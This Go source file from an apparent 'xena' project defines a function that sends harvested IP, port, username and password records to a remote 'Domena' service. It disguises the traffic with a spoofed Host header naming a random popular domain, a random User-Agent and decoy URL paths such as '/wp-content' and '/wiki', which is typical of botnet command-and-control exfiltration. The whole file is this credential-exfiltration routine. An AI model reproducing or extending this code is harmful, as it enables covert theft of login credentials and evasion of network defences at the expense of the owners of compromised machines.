package gateway

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"xena/helpers"
	"xena/networking"
)

type Creds struct {
	Ip   string `json:"ip"`
	Port int    `json:"port"`
	User string `json:"user"`
	Pass string `json:"pass"`
}

// SubmitCreds sends credentials to the Domena service.
func SubmitCreds(host string, creds Creds) error {
	credsJson, err := json.Marshal(creds)
	if err != nil {
		return err
	}

	payloadJson, err := networking.SerializedTraffic(string(credsJson))
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", host+helpers.RandEntry(domenaPostServiceMap), bytes.NewBuffer([]byte(payloadJson)))
	request.Host = helpers.RandomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", helpers.RandomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	defer response.Body.Close()

	// Domena service should return 201 - Created.
	if response.StatusCode != http.StatusCreated {
		return errors.New("insertion of service details failed with status:" + response.Status)
	}

	return nil
}

// Xena-Service-Domena POST /v1/services
var domenaPostServiceMap = []string{
	"/v1/services",
	"/wp-content",
	"/en-us",
	"/quote",
	"/channel",
	"/channel/profile",
	"/article",
	"/article/data",
	"/wiki",
	"/category",
	"/music",
}
